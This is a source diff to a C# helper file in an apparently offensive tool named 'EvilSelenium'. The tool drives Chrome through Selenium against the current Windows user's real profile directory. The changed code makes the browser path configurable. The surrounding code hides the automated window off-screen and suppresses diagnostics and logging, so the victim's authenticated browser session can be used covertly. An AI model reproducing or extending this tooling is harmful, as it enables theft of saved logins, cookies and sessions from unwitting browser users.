@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Diagnostics;
 using System.Text;
 using OpenQA.Selenium;
@@ -14,6 +15,8 @@ namespace EvilSelenium.Misc
     /* Generic helper functions */
     class Helpers
     {
+        public static string BrowserRouting = @"Google\Chrome";
+
         [DllImport("advapi32.dll", SetLastError = true)]
         static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
 
@@ -43,7 +46,12 @@ namespace EvilSelenium.Misc
             service.SuppressInitialDiagnosticInformation = true;
             ChromeOptions options = new ChromeOptions();
 
-            options.AddArgument(@"user-data-dir=C:\Users\" + Buffer.ToString() + @"\AppData\Local\Google\Chrome\User Data");
+            string user_data_dir = String.Format(@"C:\Users\{0}\AppData\Local\{1}\User Data", Buffer.ToString(), BrowserRouting);
+
+            if (!Directory.Exists(user_data_dir))
+                throw new Exception($"Assembeled browser user-data-dir is invalid: {user_data_dir}");
+
+            options.AddArgument($@"user-data-dir={user_data_dir}");
             options.AddArgument("log-level=3");
             options.AddArgument("window-position=5000,1000");
             options.AddExcludedArgument("enable-logging");
